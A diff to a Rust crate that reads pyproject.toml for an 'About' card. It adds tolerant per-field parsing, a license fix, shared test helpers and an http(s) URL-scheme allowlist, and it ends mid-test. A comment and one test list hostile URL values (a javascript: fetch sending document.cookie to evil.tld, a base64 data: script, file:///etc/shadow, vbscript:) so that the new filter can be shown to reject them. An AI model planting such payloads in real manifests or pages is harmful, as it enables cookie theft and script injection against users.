@@ -9,21 +9,25 @@
 //! parse errors are reported via `tracing` (`debug!` / `warn!`) so a malformed
 //! manifest does not silently look like a missing one (TASK-0394).
 
-#![cfg_attr(
-    test,
-    allow(
-        clippy::unwrap_used,
-        clippy::cast_possible_truncation,
-        clippy::cast_precision_loss,
-        clippy::cast_sign_loss
-    )
-)]
+// READ-10 / TASK-1761: `unwrap_used` only — the test modules `.unwrap()`
+// tempdir / serde results throughout, and a `Result`-returning test would
+// bury the assertion. The crate performs no numeric conversion of any kind,
+// so the `cast_*` allows that used to sit here were pre-authorisation for
+// casts nobody had reviewed; `docs/clippy.md` requires the narrowest scope
+// that works.
+#![cfg_attr(test, allow(clippy::unwrap_used))]
 
 mod units;
 
 use std::path::Path;
 
 use ops_about::identity::{provide_identity_from_manifest, ParsedManifest};
+// DUP-3 / TASK-1258: route through the shared
+// [`ops_about::text_util::trim_nonempty`] so the about-python and about-node
+// ERR-2 contracts are pinned at the same source location.
+// DUP-3 / TASK-1758: same reasoning for `contains_control_chars`, and
+// SEC-11 / TASK-1755 for the `has_allowed_url_scheme` allowlist.
+use ops_about::text_util::{contains_control_chars, has_allowed_url_scheme, trim_nonempty};
 use ops_core::project_identity::{base_about_fields, insert_homepage_field, AboutFieldDef};
 use ops_extension::{Context, DataProvider, DataProviderError, ExtensionType};
 use serde::Deserialize;
@@ -133,22 +137,50 @@ struct Pyproject {
     has_tool_uv: bool,
 }
 
+/// PATTERN-1 / TASK-1774: `[project]` is held as an untyped `toml::Table` and
+/// each key is projected onto its own shape by [`project_field`], instead of
+/// being deserialised into one all-or-nothing struct.
+///
+/// `Option<T>` on a struct field models *absence*, never a *type mismatch*, so
+/// the previous shape aborted the whole deserialisation on any single bad key.
+/// A manifest carrying `authors = ["Alice <a@x.com>"]` — the Poetry
+/// `[tool.poetry]` spelling, which authors migrating to PEP 621 routinely
+/// carry over — is well-formed TOML and mostly valid PEP 621, yet it collapsed
+/// the entire identity to the directory-name fallback with no version, no
+/// license, no description and no URLs, even though `name` and `version` sat
+/// well-formed in the same table.
 #[derive(Debug, Deserialize)]
 struct RawPyproject {
-    project: Option<RawProject>,
+    project: Option<toml::Table>,
     tool: Option<RawTool>,
 }
 
-#[derive(Debug, Deserialize)]
-struct RawProject {
-    name: Option<String>,
-    version: Option<String>,
-    description: Option<String>,
-    #[serde(rename = "requires-python")]
-    requires_python: Option<String>,
-    license: Option<LicenseField>,
-    authors: Option<Vec<RawAuthor>>,
-    urls: Option<std::collections::BTreeMap<String, String>>,
+/// Deserialise one `[project]` key, degrading that key alone on a type
+/// mismatch.
+///
+/// PATTERN-1 / TASK-1774: a failure warns with the offending field path and
+/// yields `None`, so every other key still populates the identity.
+fn project_field<T>(project: &toml::Table, key: &str, manifest_path: &Path) -> Option<T>
+where
+    T: for<'de> Deserialize<'de>,
+{
+    let value = project.get(key)?;
+    match T::deserialize(value.clone()) {
+        Ok(parsed) => Some(parsed),
+        Err(e) => {
+            // ERR-7 / TASK-0974: Debug-format the path so embedded newlines /
+            // ANSI in an attacker-controlled checkout path cannot forge log
+            // records.
+            tracing::warn!(
+                path = ?manifest_path.display(),
+                field = %format!("project.{key}"),
+                error = %e,
+                recovery = "skip-field",
+                "failed to project a pyproject [project] field; other fields are unaffected"
+            );
+            None
+        }
+    }
 }
 
 #[derive(Debug, Deserialize)]
@@ -165,6 +197,21 @@ enum LicenseField {
 struct RawAuthor {
     name: Option<String>,
     email: Option<String>,
+}
+
+/// One entry of `[project].authors`.
+///
+/// PATTERN-1 / TASK-1774: PEP 621 specifies the `{ name, email }` table form,
+/// but the bare-string form (`authors = ["Alice <a@x.com>"]`) is what Poetry
+/// uses and is common in the wild. Accepting both — and tolerating anything
+/// else as a skipped entry rather than a hard deserialisation failure — keeps
+/// one odd author from discarding the rest of `[project]`.
+#[derive(Debug, Deserialize)]
+#[serde(untagged)]
+enum RawAuthorEntry {
+    Table(RawAuthor),
+    Name(String),
+    Unsupported(toml::Value),
 }
 
 #[derive(Debug, Deserialize)]
@@ -207,14 +254,32 @@ fn parse_pyproject(project_root: &Path) -> Option<Pyproject> {
         ..Pyproject::default()
     };
 
-    if let Some(p) = raw.project {
-        out.name = trim_nonempty(p.name);
-        out.version = trim_nonempty(p.version);
-        out.description = trim_nonempty(p.description);
-        out.requires_python = trim_nonempty(p.requires_python);
-        out.license = p.license.and_then(normalize_license);
-        out.authors = format_authors(p.authors.unwrap_or_default());
-        if let Some(urls) = p.urls {
+    if let Some(project) = raw.project {
+        let manifest_path = project_root.join("pyproject.toml");
+        out.name = trim_nonempty(project_field::<String>(&project, "name", &manifest_path));
+        out.version = trim_nonempty(project_field::<String>(&project, "version", &manifest_path));
+        out.description = trim_nonempty(project_field::<String>(
+            &project,
+            "description",
+            &manifest_path,
+        ));
+        out.requires_python = trim_nonempty(project_field::<String>(
+            &project,
+            "requires-python",
+            &manifest_path,
+        ));
+        out.license = project_field::<LicenseField>(&project, "license", &manifest_path)
+            .and_then(normalize_license);
+        out.authors = format_authors(
+            project_field::<Vec<RawAuthorEntry>>(&project, "authors", &manifest_path)
+                .unwrap_or_default(),
+            &manifest_path,
+        );
+        if let Some(urls) = project_field::<std::collections::BTreeMap<String, String>>(
+            &project,
+            "urls",
+            &manifest_path,
+        ) {
             let (homepage, repository) = extract_urls(&urls);
             out.homepage = homepage;
             out.repository = repository;
@@ -234,33 +299,52 @@ fn parse_pyproject(project_root: &Path) -> Option<Pyproject> {
 fn normalize_license(license: LicenseField) -> Option<String> {
     match license {
         LicenseField::Text(s) => trim_nonempty(Some(s)),
-        LicenseField::Table { text: Some(t), .. } => trim_nonempty(Some(t)),
-        LicenseField::Table { file: Some(f), .. } => {
-            trim_nonempty(Some(f)).map(|f| format!("License file: {f}"))
-        }
-        LicenseField::Table { .. } => None,
+        // PATTERN-1 / TASK-1759: try the arms in *value* order, not field
+        // order. Matching on `text: Some(_)` first let a whitespace-only
+        // `text` claim the match and return `None`, so the `file` arm was
+        // unreachable for `{ text = "  ", file = "LICENSE" }` — a shape any
+        // generator that emits every PEP 621 key produces — and the About
+        // card showed no license although the manifest declared one.
+        LicenseField::Table { text, file } => trim_nonempty(text)
+            .or_else(|| trim_nonempty(file).map(|f| format!("License file: {f}"))),
     }
 }
 
 /// ERR-2 / TASK-0704: trim+drop-empty for each author component so a
 /// whitespace-only field does not render as a blank bullet — matching
 /// package.json's `format_person`.
-fn format_authors(authors: Vec<RawAuthor>) -> Vec<String> {
+fn format_authors(authors: Vec<RawAuthorEntry>, manifest_path: &Path) -> Vec<String> {
     authors
         .into_iter()
-        .filter_map(|a| {
-            let name = trim_nonempty(a.name);
-            let email = trim_nonempty(a.email);
-            match (name, email) {
-                (Some(n), Some(e)) => Some(format!("{n} <{e}>")),
-                (Some(n), None) => Some(n),
-                // ERR-2 / TASK-0980: render the email-only case as
-                // `<email>` to match `extensions-node/about::format_person`
-                // — both providers feed the same About card schema and a
-                // bare email next to "Name <email>" entries renders
-                // inconsistently in a multi-author list.
-                (None, Some(e)) => Some(format!("<{e}>")),
-                (None, None) => None,
+        .filter_map(|entry| match entry {
+            RawAuthorEntry::Table(a) => {
+                let name = trim_nonempty(a.name);
+                let email = trim_nonempty(a.email);
+                match (name, email) {
+                    (Some(n), Some(e)) => Some(format!("{n} <{e}>")),
+                    (Some(n), None) => Some(n),
+                    // ERR-2 / TASK-0980: render the email-only case as
+                    // `<email>` to match `extensions-node/about::format_person`
+                    // — both providers feed the same About card schema and a
+                    // bare email next to "Name <email>" entries renders
+                    // inconsistently in a multi-author list.
+                    (None, Some(e)) => Some(format!("<{e}>")),
+                    (None, None) => None,
+                }
+            }
+            // PATTERN-1 / TASK-1774: the Poetry-style bare string is already
+            // in the rendered `Name <email>` shape, so pass it through after
+            // the same ERR-2 trim+drop.
+            RawAuthorEntry::Name(s) => trim_nonempty(Some(s)),
+            RawAuthorEntry::Unsupported(value) => {
+                tracing::warn!(
+                    path = ?manifest_path.display(),
+                    field = "project.authors",
+                    kind = value.type_str(),
+                    recovery = "skip-author",
+                    "unsupported [project].authors entry; keeping the remaining authors"
+                );
+                None
             }
         })
         .collect()
@@ -314,24 +398,26 @@ fn extract_urls(
 /// keep the first-seen entry, and emit a `tracing::warn!` naming both
 /// raw keys and both URLs so the operator sees the schema drift instead
 /// of a silently dropped URL. Same finding class as TASK-1019 / TASK-1100.
+///
+/// PERF-3 / TASK-1769: one map keyed by the normalised key, holding the
+/// first-seen `(raw_key, url)` pair. The previous shape kept a second
+/// same-sized `first_seen_raw` map read on exactly one line — the collision
+/// warn — which forced a `norm.clone()` per key and needed a `map_or("")`
+/// fallback for a key that is structurally guaranteed to be present. Holding
+/// both halves in one entry makes that invariant structural rather than
+/// something two containers must keep in lockstep.
 fn normalize_urls(
     urls: &std::collections::BTreeMap<String, String>,
-) -> std::collections::HashMap<String, &String> {
-    let mut out: std::collections::HashMap<String, &String> =
-        std::collections::HashMap::with_capacity(urls.len());
-    let mut first_seen_raw: std::collections::HashMap<String, &String> =
+) -> std::collections::HashMap<String, (&String, &String)> {
+    let mut out: std::collections::HashMap<String, (&String, &String)> =
         std::collections::HashMap::with_capacity(urls.len());
     for (k, v) in urls {
         let norm = normalize_url_key(k);
-        if let Some(existing_url) = out.get(&norm) {
-            let existing_key = first_seen_raw
-                .get(&norm)
-                .copied()
-                .map_or("", std::string::String::as_str);
+        if let Some((first_key, first_url)) = out.get(&norm) {
             tracing::warn!(
                 normalized_key = %norm,
-                first_key = %existing_key,
-                first_url = %existing_url,
+                first_key = %first_key,
+                first_url = %first_url,
                 duplicate_key = %k,
                 duplicate_url = %v,
                 recovery = "keep-first",
@@ -339,19 +425,18 @@ fn normalize_urls(
             );
             continue;
         }
-        out.insert(norm.clone(), v);
-        first_seen_raw.insert(norm, k);
+        out.insert(norm, (k, v));
     }
     out
 }
 
 fn pick_url(
-    normalized: &std::collections::HashMap<String, &String>,
+    normalized: &std::collections::HashMap<String, (&String, &String)>,
     keys: &[&str],
 ) -> Option<String> {
     let raw = keys.iter().find_map(|target| {
         let target_norm = normalize_url_key(target);
-        normalized.get(&target_norm).map(|v| (*v).clone())
+        normalized.get(&target_norm).map(|(_, v)| (*v).clone())
     });
     // DUP-3 / TASK-1258: route through the shared trim+drop helper rather
     // than reimplement the chain inline. TASK-0964 / ERR-2 / TASK-0704
@@ -364,33 +449,86 @@ fn pick_url(
     // silently concatenate the attacker-controlled tail
     // (`https://demo.dev\nINJECT` → `https://demo.devINJECT`) into a
     // clickable URL; dropping surfaces the field as missing.
-    trim_nonempty(raw).filter(|s| !contains_control_chars(s))
-}
-
-/// SEC-2 / TASK-1207: detect ASCII / Unicode control characters (C0:
-/// U+0000..U+001F, DEL U+007F, plus the broader `char::is_control` set
-/// covering C1) in a `[project.urls]` value. The field is rendered into
-/// About cards (markdown + HTML), JSON output, and operator-facing log
-/// lines; any control byte is treated as evidence of tampering and the
-/// field is dropped. Sister policy to
-/// `extensions-node/about::repo_url::contains_control_chars` (TASK-1165).
-fn contains_control_chars(raw: &str) -> bool {
-    raw.chars().any(|c| c.is_control() || c == '\u{007f}')
+    //
+    // SEC-11 / TASK-1755: the value must additionally carry an allowlisted
+    // scheme (`https://` / `http://`, see
+    // [`ops_about::text_util::has_allowed_url_scheme`]). `pyproject.toml` is
+    // untrusted input, and without the allowlist a
+    // `Homepage = "javascript:fetch('https://evil.tld/?c='+document.cookie)"`
+    // or `Repository = "file:///etc/shadow"` flowed verbatim into the About
+    // card, `ops about --json`, and every markdown / HTML surface downstream
+    // of them. Rejection drops the field to `None`, the same drop-not-strip
+    // policy SEC-2 / TASK-1207 applies to control characters, rather than
+    // emitting a partial URL. Scheme-less values are rejected rather than
+    // guessed at. Sibling policy: SEC-11 / TASK-1722 in
+    // `extensions-node/about::repo_url::normalize_repo_url`.
+    trim_nonempty(raw)
+        .filter(|s| !contains_control_chars(s))
+        .filter(|s| has_allowed_url_scheme(s))
 }
 
 fn normalize_url_key(key: &str) -> String {
     key.trim().to_ascii_lowercase().replace('-', " ")
 }
 
-/// DUP-3 / TASK-1258: route through the shared
-/// [`ops_about::text_util::trim_nonempty`] so the about-python and
-/// about-node ERR-2 contracts are pinned at the same source location.
-use ops_about::text_util::trim_nonempty;
-
 #[cfg(test)]
 mod tests {
     use super::*;
     use ops_core::project_identity::ProjectIdentity;
+
+    /// DUP-1 / TASK-1763: sixteen tests in this module opened with the same
+    /// five-statement tempdir / write / `test_context` / deserialise preamble,
+    /// which buried the one line per test that states the contract and made
+    /// every `provide` signature change a sixteen-site edit. The two shapes
+    /// below carry that preamble once.
+    fn identity_from(pyproject: &str) -> ProjectIdentity {
+        identity_from_with_files(pyproject, &[])
+    }
+
+    /// [`identity_from`] plus extra fixture files written relative to the
+    /// project root — `uv.lock` and `.git/config` are the two cases that need
+    /// them.
+    fn identity_from_with_files(pyproject: &str, extra: &[(&str, &str)]) -> ProjectIdentity {
+        let dir = tempfile::tempdir().unwrap();
+        ops_about::test_support::write_file(&dir.path().join("pyproject.toml"), pyproject);
+        for (relative, content) in extra {
+            ops_about::test_support::write_file(&dir.path().join(relative), content);
+        }
+        identity_at(dir.path())
+    }
+
+    /// Run the provider against an existing project root. Split out so the
+    /// no-manifest case can share the deserialise step without writing one.
+    fn identity_at(root: &Path) -> ProjectIdentity {
+        let provider = PythonIdentityProvider;
+        let mut ctx = ops_extension::Context::test_context(root.to_path_buf());
+        serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap()
+    }
+
+    /// Capture the WARN records `f` emits, rendered as text.
+    ///
+    /// TEST-5 / TASK-1756 + TASK-1757: several contracts in this crate *are*
+    /// the warn record — its presence, its `path`, and its `recovery` field —
+    /// so asserting on rendered output is the only way to pin them.
+    fn capture_warns<T>(f: impl FnOnce() -> T) -> (T, String) {
+        // `tracing` caches each callsite's `Interest` process-wide against the
+        // dispatchers registered when that callsite is first hit. A sibling
+        // test running in parallel can first-hit one of the warn callsites
+        // below while only scoped subscribers exist, caching
+        // `Interest::never()` so the warn never fires again and this capture
+        // comes back empty at random. `count_warnings` pins a global
+        // dispatcher and rebuilds the interest cache exactly once per test
+        // binary — see its doc comment in `ops_about::test_support`.
+        let ((), _) = ops_about::test_support::count_warnings(|| ());
+        let buf = ops_about::test_support::TracingBuf::default();
+        let subscriber = tracing_subscriber::fmt()
+            .with_writer(buf.clone())
+            .with_max_level(tracing::Level::WARN)
+            .with_ansi(false)
+            .finish();
+        let out = tracing::subscriber::with_default(subscriber, f);
+        (out, buf.captured())
+    }
 
     /// ERR-7 (TASK-0818): manifest paths flow through `tracing::warn!` via
     /// the `?` formatter so embedded newlines or ANSI escapes cannot forge
@@ -441,9 +579,7 @@ mod tests {
 
     #[test]
     fn whitespace_only_license_and_author_components_are_dropped() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -451,13 +587,7 @@ version = "0.1.0"
 license = "  "
 authors = [{ name = "  ", email = "  " }]
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert!(id.license.is_none());
         assert!(id.authors.is_empty());
@@ -465,23 +595,29 @@ authors = [{ name = "  ", email = "  " }]
 
     #[test]
     fn whitespace_only_requires_python_does_not_render() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
-            "[project]\nname = \"demo\"\nversion = \"0.1.0\"\nrequires-python = \"  \"\n",
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "0.1.0"
+requires-python = "  "
+"#,
+        );
 
         assert_eq!(id.stack_detail, None);
     }
 
     #[test]
     fn pick_url_repository_takes_precedence_over_source_and_source_code() {
+        const REPO_KEYS: &[&str] = &[
+            "repository",
+            "source",
+            "source-code",
+            "sourcecode",
+            "code",
+            "repo",
+        ];
+
         let mut urls = std::collections::BTreeMap::new();
         urls.insert(
             "Source-Code".to_string(),
@@ -493,53 +629,21 @@ authors = [{ name = "  ", email = "  " }]
             "https://example.com/repo".to_string(),
         );
 
-        let picked = pick_url(
-            &normalize_urls(&urls),
-            &[
-                "repository",
-                "source",
-                "source-code",
-                "sourcecode",
-                "code",
-                "repo",
-            ],
-        );
+        let picked = pick_url(&normalize_urls(&urls), REPO_KEYS);
         assert_eq!(picked.as_deref(), Some("https://example.com/repo"));
 
         urls.remove("Repository");
-        let picked = pick_url(
-            &normalize_urls(&urls),
-            &[
-                "repository",
-                "source",
-                "source-code",
-                "sourcecode",
-                "code",
-                "repo",
-            ],
-        );
+        let picked = pick_url(&normalize_urls(&urls), REPO_KEYS);
         assert_eq!(picked.as_deref(), Some("https://example.com/src"));
 
         urls.remove("source");
-        let picked = pick_url(
-            &normalize_urls(&urls),
-            &[
-                "repository",
-                "source",
-                "source-code",
-                "sourcecode",
-                "code",
-                "repo",
-            ],
-        );
+        let picked = pick_url(&normalize_urls(&urls), REPO_KEYS);
         assert_eq!(picked.as_deref(), Some("https://example.com/sc"));
     }
 
     #[test]
     fn parse_minimal_pyproject() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "codeagent-bench"
@@ -550,13 +654,7 @@ requires-python = ">=3.11"
 license = { text = "MIT" }
 authors = [{ name = "rsvaleri" }]
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.name, "codeagent-bench");
         assert_eq!(id.version.as_deref(), Some("0.0.1"));
@@ -569,27 +667,22 @@ authors = [{ name = "rsvaleri" }]
 
     #[test]
     fn detects_uv_from_lockfile() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
-            "[project]\nname = \"demo\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\n",
-        )
-        .unwrap();
-        std::fs::write(dir.path().join("uv.lock"), "# uv lockfile\n").unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        let id = identity_from_with_files(
+            r#"
+[project]
+name = "demo"
+version = "0.1.0"
+requires-python = ">=3.12"
+"#,
+            &[("uv.lock", "# uv lockfile\n")],
+        );
 
         assert_eq!(id.stack_detail.as_deref(), Some("Python >=3.12 · uv"));
     }
 
     #[test]
     fn detects_uv_from_tool_table() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -598,44 +691,86 @@ version = "0.1.0"
 [tool.uv]
 dev-dependencies = []
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.stack_detail.as_deref(), Some("uv"));
     }
 
     #[test]
     fn license_file_form_is_labeled() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
 version = "1.0.0"
 license = { file = "LICENSE" }
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.license.as_deref(), Some("License file: LICENSE"));
     }
 
+    /// PATTERN-1 / TASK-1759: matching on `text: Some(_)` before the `file`
+    /// arm let a whitespace-only `text` claim the match and drop the license
+    /// entirely, making the `file` arm unreachable for a shape any generator
+    /// that emits every PEP 621 key produces.
+    #[test]
+    fn blank_license_text_falls_through_to_the_file_form() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
+license = { text = "  ", file = "LICENSE" }
+"#,
+        );
+
+        assert_eq!(id.license.as_deref(), Some("License file: LICENSE"));
+    }
+
+    /// The fall-through must not resurrect a blank `file` either — both
+    /// whitespace-only still drops the field (ERR-2 / TASK-0704).
+    #[test]
+    fn blank_license_text_and_file_still_drops() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
+license = { text = "  ", file = "  " }
+"#,
+        );
+
+        assert!(id.license.is_none(), "got: {:?}", id.license);
+    }
+
+    /// A `text`-only table and an empty table keep their existing behaviour.
+    #[test]
+    fn license_table_text_only_and_empty_table_are_unchanged() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
+license = { text = "MIT" }
+"#,
+        );
+        assert_eq!(id.license.as_deref(), Some("MIT"));
+
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
+license = {}
+"#,
+        );
+        assert!(id.license.is_none(), "got: {:?}", id.license);
+    }
+
     #[test]
     fn parses_urls_case_insensitive_and_kebab() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -645,13 +780,7 @@ version = "1.0.0"
 homepage = "https://demo.dev"
 source-code = "https://github.com/x/demo"
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
         assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
@@ -659,9 +788,7 @@ source-code = "https://github.com/x/demo"
 
     #[test]
     fn parses_urls_homepage_and_repository() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -671,13 +798,7 @@ version = "1.0.0"
 Homepage = "https://demo.dev"
 Repository = "https://github.com/x/demo"
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
         assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
@@ -688,22 +809,16 @@ Repository = "https://github.com/x/demo"
     /// to name/license/requires-python/authors.
     #[test]
     fn whitespace_only_url_resolves_to_none() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
-            "[project]\n\
-             name = \"demo\"\n\
-             version = \"1.0.0\"\n\
-             \n\
-             [project.urls]\n\
-             Homepage = \"   \"\n",
-        )
-        .unwrap();
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
 
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+[project.urls]
+Homepage = "   "
+"#,
+        );
 
         assert!(
             id.homepage.is_none(),
@@ -720,22 +835,16 @@ Repository = "https://github.com/x/demo"
     /// attacker-named URL; dropping surfaces the field as missing.
     #[test]
     fn homepage_with_embedded_newline_drops_field() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
-            "[project]\n\
-             name = \"demo\"\n\
-             version = \"1.0.0\"\n\
-             \n\
-             [project.urls]\n\
-             Homepage = \"https://demo.dev\\nINJECTED\"\n",
-        )
-        .unwrap();
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
 
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+[project.urls]
+Homepage = "https://demo.dev\nINJECTED"
+"#,
+        );
 
         assert!(
             id.homepage.is_none(),
@@ -749,22 +858,16 @@ Repository = "https://github.com/x/demo"
     /// repaint the operator terminal when the About card is rendered.
     #[test]
     fn repository_with_embedded_ansi_drops_field() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
-            "[project]\n\
-             name = \"demo\"\n\
-             version = \"1.0.0\"\n\
-             \n\
-             [project.urls]\n\
-             Repository = \"https://demo.dev\\u001b[31mfake\"\n",
-        )
-        .unwrap();
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
 
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+[project.urls]
+Repository = "https://demo.dev\u001b[31mfake"
+"#,
+        );
 
         assert!(
             id.repository.is_none(),
@@ -773,15 +876,71 @@ Repository = "https://github.com/x/demo"
         );
     }
 
+    /// SEC-11 / TASK-1755: `pyproject.toml` is untrusted input, so a
+    /// `[project.urls]` value whose scheme is not on the `http(s)` allowlist
+    /// must drop the field to `None` rather than reach the About card, the
+    /// markdown / HTML surfaces, or `ops about --json` as a clickable
+    /// `javascript:` / `data:` payload or a `file:` exfiltration link.
+    #[test]
+    fn non_allowlisted_url_schemes_drop_the_homepage_and_repository() {
+        for hostile in [
+            "javascript:fetch('https://evil.tld/?c='+document.cookie)",
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "file:///etc/shadow",
+            "vbscript:msgbox(1)",
+        ] {
+            let id = identity_from(&format!(
+                r#"
+[project]
+name = "demo"
+version = "1.0.0"
+
+[project.urls]
+Homepage = "{hostile}"
+Repository = "{hostile}"
+"#
+            ));
+
+            assert!(
+                id.homepage.is_none(),
+                "Homepage must drop for {hostile:?}, got: {:?}",
+                id.homepage
+            );
+            assert!(
+                id.repository.is_none(),
+                "Repository must drop for {hostile:?}, got: {:?}",
+                id.repository
+            );
+        }
+    }
+
+    /// SEC-11 / TASK-1755: a scheme-less value is rejected rather than
+    /// guessed at — inventing `https://` would fabricate a link the manifest
+    /// never declared. The repository slot has a git-remote fallback, so this
+    /// pins the homepage slot where a rejection is directly observable.
+    #[test]
+    fn scheme_less_homepage_is_rejected() {
+        let id = identity_from(
+            r#"
+[project]
+name = "demo"
+version = "1.0.0"
+
+[project.urls]
+Homepage = "example.com/x"
+"#,
+        );
+
+        assert!(id.homepage.is_none(), "got: {:?}", id.homepage);
+    }
+
     /// PATTERN-1 / TASK-1062: PEP 621 distinguishes `Homepage` from
     /// `Documentation`. A pyproject with only a `Documentation` URL must NOT
     /// have its docs URL surfaced as the project homepage — the homepage
     /// field should fall through to None.
     #[test]
     fn documentation_only_url_does_not_become_homepage() {
-        let dir = tempfile::tempdir().unwrap();
-        std::fs::write(
-            dir.path().join("pyproject.toml"),
+        let id = identity_from(
             r#"
 [project]
 name = "demo"
@@ -790,13 +949,7 @@ version = "1.0.0"
 [project.urls]
 Documentation = "https://docs.x"
 "#,
-        )
-        .unwrap();
-
-        let provider = PythonIdentityProvider;
-        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
-        let id: ProjectIdentity =
-            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
+        );
 
         assert!(
             id.homepage.is_none(),
@@ -805,17 +958,176 @@ Documentation = "https://docs.x"
         );
     }
 
+    /// PATTERN-1 / TASK-1110: two raw keys that collapse under
+    /// `normalize_url_key` must keep the **first-seen** (`BTreeMap`-order)
+    /// entry and warn, rather than letting a naive `.collect()` pick an
+    /// arbitrary last-write-wins winner. TEST-5 / TASK-1757: reverting
+    /// `normalize_urls` to `urls.iter().map(...).collect()` fails this test.
+    #[test]
+    fn colliding_url_keys_keep_the_first_seen_entry_and_warn() {
+        let mut urls = std::collections::BTreeMap::new();
+        // `normalize_url_key` lowercases and maps `-` to a space, so
+        // "Home-Page" and "home page" both collapse to "home page".
+        // BTreeMap order: "Home-Page" (uppercase H, 0x48) sorts before
+        // "home page" (lowercase h, 0x68), so "Home-Page" is first-seen.
+        urls.insert("Home-Page".to_string(), "https://first.dev".to_string());
+        urls.insert("home page".to_string(), "https://second.dev".to_string());
+
+        let (picked, logs) =
+            capture_warns(|| pick_url(&normalize_urls(&urls), &["homepage", "home", "home-page"]));
+
+        assert_eq!(picked.as_deref(), Some("https://first.dev"));
+        assert!(
+            logs.contains("first_key=Home-Page"),
+            "warn must name the first-seen raw key: {logs}"
+        );
+        assert!(
+            logs.contains("duplicate_key=home page"),
+            "warn must name the colliding raw key: {logs}"
+        );
+        assert!(
+            logs.contains("first_url=https://first.dev"),
+            "warn must carry the retained URL: {logs}"
+        );
+        assert!(
+            logs.contains("duplicate_url=https://second.dev"),
+            "warn must carry the discarded URL: {logs}"
+        );
+        assert!(
